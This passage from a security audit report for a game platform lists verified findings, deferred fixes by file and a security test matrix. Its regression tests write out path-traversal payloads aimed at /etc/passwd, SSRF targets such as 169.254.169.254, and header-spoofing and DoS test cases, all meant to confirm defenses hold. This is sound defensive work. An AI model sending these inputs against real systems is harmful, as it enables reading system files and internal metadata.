**`/content/*` path-traversal — verified safe.** `apps/client/vite.config.ts:48-52` (`resolve` + `startsWith(rootDir+sep)`) + `nginx.conf:186-216` (root-based `/content`). Decode → resolve → reject-not-under-root before any stat/read; `../`, `%2e%2e`, absolute escapes fall through; null bytes swallowed by `existsSync`. nginx serves via `root` (no alias-slash traversal) and gates the restricted prefix by socket peer. Only residual is a planted symlink (F-17). **Test to keep:** `/content/../../etc/passwd`, `/content/%2e%2e/%2e%2e/etc/passwd`, and an absolute payload all 404. **Fix:** none required; optional `realpath` hardening = F-17.

### F-24 · platform · verified clean
**CORS posture — no `ACAO`/credentials wildcard anywhere.** `apps/platform/internal/httpx/httpx.go:42` sets only Content-Type; no `Access-Control-Allow-Origin`/`-Credentials` in `apps/**` or `nginx/**`; game-server sets no CORS headers. Same-origin architecture; bearer tokens (not cookies) mean no cross-origin credential leakage even if CORS were relaxed. **Test to keep:** CI grep asserting no handler sets `ACAO:*` together with `Access-Control-Allow-Credentials: true`. **Fix:** none required.

### F-25 · infra · verified fixed (#117)
**#117 session store no longer LAN-exposed.** `docker/compose.yaml:22-39` binds redis to `127.0.0.1:6379` + `--requirepass` (`${REDIS_PASSWORD:?…}` fail-fast); helm redis Service is ClusterIP; a repo-wide grep for the orphaned `ggd-redis-e2e`/`redis-e2e` harness returns nothing. **Test to keep:** CI guard grepping the tree for any redis port binding not prefixed `127.0.0.1` and for a reappearance of the harness; a compose config-lint asserting `requirepass`. **Fix:** none; keep the regression guard.

### F-26 · platform · verified correct (#126)
**#126 fail-closed secret boot guard + pending-account token withholding.** `config.go:124-130` + `server.go:85-97,124-126` (`checkRequiredSecrets`) error on an empty `JWT_SIGNING_SECRET`/`PLATFORM_GAME_SHARED_SECRET`; `main.go` exits(1); `auth/service.go:157-166` issues an empty `TokenPair` to a pending account and re-checks ban/approval on login+refresh. **Test to keep:** boot-fails-on-missing-secret + pending-registration-empty-TokenPair + denyAccount-revokes-refresh. **Fix:** none; keep the guards. (Note the boot guard checks non-empty, not non-weak — see F-20.)

---

## Deferred fixes for reconcile

Every `safeNow=false` fix, with its exact file and change, grouped by the wave it
should land with so reconcile can execute it mechanically. Nothing here is being
applied in this docs pass.

### Reconcile with #127 (content-serving / vite / nginx / edge wave)

| Finding | File | Mechanical fix |
| --- | --- | --- |
| F-17 | `apps/client/vite.config.ts` (`staticHandler` ~45-61); mirror `apps/admin/vite.config.ts:40-49` | After `resolve()`, `realpathSync` the candidate and re-check `startsWith(rootDir+sep)` before stat/stream; on error `next()`. Apply to content + blizzard-overlay roots. |
| F-22 | `apps/client/vite.config.ts:53-54` (`staticHandler`) | `res.setHeader('X-Content-Type-Options','nosniff')`; optionally 404 extensions outside CONTENT_MIME. |
| F-15 | `nginx/nginx.conf:142,180` (+ synced `deploy/helm/ggd/files/nginx.conf`) | Replace `frame-ancestors 'none'` with the full policy (see F-15 fix). Coordinate with client bundle (vite nonce/inline-style). |
| F-16 (infra half) | `nginx/nginx.conf` prod profile | `location ~ (model-budget\|-audition)\.html$ { return 404; }`. |
| F-23 | `apps/client/vite.config.ts:48-52` | Optional only — same `realpath` hardening as F-17; keep the traversal regression test. |

### Reconcile with #152 (client UI/render wave)

| Finding | File | Mechanical fix |
| --- | --- | --- |
| F-06 | `apps/client/src/ui/WorldAnchorLayer.tsx:40-58` (`makeChampionNode`) | Build the bar skeleton once; set the name via `nameEl.textContent = name`; set `color`/numeric via `element.style`, never in the HTML string. |
| F-16 (client half) | `apps/client/public/*.html` + client build step | Move audition/debug HTML out of `public/` into a dev-only dir (or strip in build) so `dist/` ships only `index.html`. |
| F-21 (client half) | `apps/client/src/ui/platform/session.ts:29-47` | Stop persisting the refresh token to localStorage; keep the access token in memory. (Pairs with the platform half below.) |

### Reconcile with #118 / platform-auth wave

| Finding | File | Mechanical fix |
| --- | --- | --- |
| F-02 | `apps/platform/internal/ai/provider.go:184-302`, `music.go:271-296` | Validate every provider-returned URL: require https; reject loopback/link-local/RFC1918/ULA/`169.254.169.254` (DialControl); constrain to the configured provider registrable domain; never send auth headers to a foreign host. |
| F-05 / F-13 | `apps/platform/internal/httpx/middleware.go:35-44` (`ClientIP`) | Trust `X-Real-Ip`/`X-Forwarded-For` only when `RemoteAddr ∈` a configured trusted-proxy CIDR; else `RemoteAddr`. Keep the resolution in `httpx` (the `devsurface_test.go` guard forbids `auth`/`server`/`admin` from reading a caller address). |
| F-09 | `apps/platform/cmd/platform/main.go:44-48` | Set `ReadTimeout`/`WriteTimeout`/`IdleTimeout` + `MaxHeaderBytes`; give the lobby WS a separate handler/deadlines so a short `WriteTimeout` doesn't kill it. |
| F-10 | `apps/platform/internal/lobby/hub.go:133`, `ws.go:69`; `nginx.conf:256` | Per-account (+per-IP) lobby-WS cap in `register`/`handleWS`; `limit_conn` on the lobby WS edge path; read-deadline/heartbeat reaper. |
| F-11 | `apps/platform/internal/auth/service.go:120-152` | Per-IP register limiter (shared with F-02-argon2); cap total pending accounts; TTL/reaper for never-approved reservations. |
| F-02-argon2 | `apps/platform/internal/auth/service.go:137`, `server.go:228` | Per-IP register limiter mirroring Login; weighted semaphore (~`NumCPU/2`) bounding concurrent argon2; keep the global cap as defense-in-depth only. |
| F-12 | `apps/platform/internal/auth/middleware.go:44-50`; `nginx.conf:46` | Scope `?token=` to the WS handshake handler; `auth.Middleware` reads the `Authorization` header only; nginx `log_format`/`map` masks `token=`. |
| F-18 | `apps/platform/internal/auth/service.go:120-135` | One opaque conflict for username+email; argon2 before the uniqueness reply (timing parity); per-IP register limiter. |
| F-19 | `apps/platform/internal/auth/jwt.go:19-44` | Mint an `aud` (`ggd-access`); add `jwt.WithIssuer("ggd-platform")` + `jwt.WithAudience("ggd-access")` to `VerifyAccess`. |
| F-21 (platform half) | `apps/platform/internal/auth/handlers.go:39-40,54,73` | Deliver the refresh token as an httpOnly + Secure + SameSite=Strict cookie instead of the JSON body. |

### Reconcile — infra / deploy

| Finding | File | Mechanical fix |
| --- | --- | --- |
| F-20 | `deploy/helm/ggd/values-local.yaml:36-38` | Generate ephemeral local secrets via `make up`, or add a boot-time denylist rejecting the known `dev-insecure-*` values in any non-development env. |

---

## Existing defenses (credited) and what they do NOT cover

- **#117 (redis LAN exposure)** — FIXED and verified (F-25): dev redis is loopback-bound + password-required, k8s Service is ClusterIP, the orphan `redis-e2e` harness is gone. **Does not cover:** the general "platform reachable off-nginx" class that F-05/F-13 and F-02 exploit — #117 removed one exposed store, not the trust-the-edge assumption.
- **#126 (fail-closed secret guard + private-deploy gate)** — CORRECT and verified (F-26): boot fails on an empty secret, pending accounts get no tokens, deny revokes live refresh. **Does not cover:** non-empty-but-weak secrets (F-20); the game-server has no equivalent boot guard (F-14); the per-IP *login* limit it relies on is keyed on a spoofable header off the edge (F-05/F-13); registration still writes unbounded pending accounts (F-11) and pays an unthrottled argon2 hash (F-02).
- **#127 (env-tier content gate, in flight)** — classifies loopback/lan/public off the socket peer and refuses copyright content to public hosts; also adds nginx WS `limit_conn`, auth `limit_req`, HSTS, body cap (via the #126/edge wave). **Does not cover:** the `/content` symlink residual (F-17), the dev handler's missing `nosniff` (F-22), the empty prod CSP (F-15), or the audition pages bundled into `dist/` (F-16) — all of which live on the same content-serving surface #127 owns and should reconcile alongside it.
- **#46 (sim spiral-of-death CPU DoS)** — FIXED: the tick loop clamps ticks-per-frame. **Does not cover:** work-per-tick — F-04 shows one INPUT with a huge `commands[]` forces O(N) in a single tick (the same freeze, on demand); and the #46 try/catch is what amplifies F-01's throw into a full-room `disconnect()`.
- **Edge hardening (nginx, #126 wave)** — per-IP auth `limit_req` (10r/m), WS `limit_conn` (20/IP on `/colyseus`+`/ws`), HSTS, 1 MiB body cap, `/api/v1/internal/**` deny. **Does not cover:** anything reaching the platform/game-server directly (LAN/pod-to-pod/port-forward), the lobby WS path (no `limit_conn`, F-10), or the missing `script-src` CSP (F-15).

---

## SECURITY TEST MATRIX

Every recommended test, one row each. **Status:** `added-now` = landing with the
game-server wave (`safeNow=true` findings); `deferred` = to be added when its
reconcile wave lands. 32 tests: 8 added-now, 24 deferred.

| Attack class | Service | Finding | Test name | Status |
| --- | --- | --- | --- | --- |
| injection (prototype) | game-server | F-01 | `commandSystem` prototype-key `slot`/`itemSlot` → reject, no throw | added-now |
| injection (prototype) | game-server | F-01 | live `MatchRoom` survives crafted `MSG.INPUT` (ticking 1s later) | added-now |
| DoS (room-flood) | game-server | F-03 | 500 unauth `create("match")` → rooms ~0, loop responsive | added-now |
| DoS (algo-complexity) | game-server | F-04 | 1M-entry `commands[]` + 5k INPUT/tick → capped, tick < budget | added-now |
| XSS-source | game-server | F-07 | `/_internal/matches` `displayName` `<>"&`/len>32 → sanitized | added-now |
| XSS-source | game-server | F-07 | client `joinOrCreate({seats})` → seats ignored / creation refused | added-now |
| fail-open (auth) | game-server | F-14 | prod boot with empty secret → exit non-zero | added-now |
| fail-open (auth) | game-server | F-14 | `onAuth` refuses no/invalid ticket in that mode | added-now |
| DoS (cpu-amplify) | platform | F-02 | 50 concurrent register direct → RSS bounded, `/healthz` <200ms | deferred |
| DoS (cpu-amplify) | platform | F-02 | per-IP register limiter rejects past N/min (independent of nginx) | deferred |
| DoS / rate-bypass | platform | F-05 | 100 logins, rotating `X-Real-Ip` direct → 429 still trips | deferred |
| DoS (slowloris) | platform | F-09 | 200 slow-body + 200 idle conns → closed, `/healthz` served | deferred |
| DoS (ws-exhaust) | platform | F-10 | 1000 lobby-WS on one token → per-account cap, goroutines bounded | deferred |
| DoS (store-growth) | platform | F-11 | 100k unique registers → account-file/Redis-key count bounded | deferred |
| SSRF | platform | F-08 | provider URL to `127.0.0.1`/`169.254.169.254` → refused, no key leak | deferred |
| auth (token-in-url) | platform | F-12 | `?token=` honored for WS handshake only; nginx log masks `token=` | deferred |
| auth (header-spoof) | platform | F-13 | `ClientIP` ignores `X-Real-Ip` unless peer ∈ trusted-proxy CIDR | deferred |
| auth (enumeration) | platform | F-18 | one generic register conflict + timing parity | deferred |
| auth (jwt-claims) | platform | F-19 | foreign `iss`/`aud` token rejected by `VerifyAccess` | deferred |
| XSS (dom) | client | F-06 | `makeChampionNode` writes name as `textContent`, no element parsed | deferred |
| CSP | infra | F-15 | edge `/` CSP has restrictive `default-src`/`script-src`; inline `<script>` blocked | deferred |
| attack-surface | client | F-16 | `dist/*.html` == only `index.html`; `/model-budget.html` → 404 (prod) | deferred |
| path-traversal (symlink) | vite | F-17 | symlink under root → 404/`next()`; encoded `%2e%2e/` refused | deferred |
| secrets (hardcoded) | infra | F-20 | `values-local.yaml` dev-insecure strings absent from non-dev manifest | deferred |
| token-storage | client | F-21 | refresh token not script-readable (httpOnly) OR strict `script-src` present | deferred |
| MIME-sniffing | vite | F-22 | `/content` responses carry `X-Content-Type-Options: nosniff` | deferred |
| path-traversal | content-serving | F-23 | `/content/../../etc/passwd` + encoded + absolute → all 404 (regression) | deferred |
| CORS | platform | F-24 | CI grep: no `ACAO:*` with `Access-Control-Allow-Credentials: true` | deferred |
| infra (regression) | infra | F-25 | CI grep: no redis binding off `127.0.0.1`; no `redis-e2e` harness | deferred |
| secrets (regression) | platform | F-26 | boot fails on missing secret; pending register → empty `TokenPair` | deferred |
| DoS (slowloris) | platform | F-09 | `MaxHeaderBytes` set / oversized header block rejected | deferred |
| auth (header-spoof) | platform | F-05/F-13 | integration: 11 rotating-`X-Real-Ip` logins from untrusted peer → 429 | deferred |

_Last updated: 2026-07-23 · task #154 · docs-only pass._
